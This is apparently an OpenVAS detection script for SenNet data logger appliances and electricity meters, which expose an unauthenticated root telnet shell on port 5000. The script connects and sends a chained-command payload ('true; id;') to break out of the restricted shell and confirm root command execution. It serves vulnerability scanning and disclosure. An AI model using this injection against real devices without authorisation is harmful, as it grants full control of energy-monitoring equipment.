###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_SenNet_telnet_5000.nasl 11863 2018-10-12 09:42:02Z mmartin $
#
# SenNet Data Logger Appliances and Electricity Meters Multiple Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140246");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11863 $");

  script_name("SenNet Data Logger Appliances and Electricity Meters Multiple Vulnerabilities");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Apr/36");

  script_tag(name:"vuldetect", value:"Try to connect to TCP port 5000 and execute the `id` command.");
  script_tag(name:"insight", value:"Vulnerability Details

1. No access control on the remote shell
The appliance runs ARM as underlying OS. Telnet access is enabled on TCP
port 5000. There is no authentication required for accessing and connecting
the remote shell. Any user can connect to the shell and issue commands.

2. Shell services running with excessive privileges (superuser)
The service runs with superuser root privileges, thus giving privileged
access to any user, without any authentication (exploited via OS Command
Injection described nexe).

3. OS Command Injection
The remote shell (attempts to) offer a restricted environment, and does not
allow executing system commands. However, it is possible to break out of
this jailed shell by chaining specific shell meta-characters and OS
commands.

The service / application is run as 'root' and OS command injection results
in full system access.");

  script_tag(name:"solution", value:"Vendor has released a fix.");
  script_tag(name:"summary", value:"The remote SenNet Appliances is affected by multiple vulnerabilities.");
  script_tag(name:"affected", value:"SenNet Optimal DataLogger appliance
SenNet Solar DataLogger appliance
SenNet Multitask Meter");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:42:02 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-04-11 11:24:42 +0200 (Tue, 11 Apr 2017)");
  script_category(ACT_ATTACK);
  script_family("Gain a shell remotely");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl");
  script_require_ports(5000);

  exit(0);
}

port = 5000;

if( ! get_port_state( port ) ) exit( 0 );

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

send( socket:soc, data:'true; id;\n');
recv = recv( socket:soc, length:64 );

close( soc );

if( recv =~ "uid=[0-9]+.*gid=[0-9]+" )
{
  report = 'It was possible to execute the `id` command by connection to port `' + port + '` of the remote device.\n\nResponse:\n\n' + recv + '\n';
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );

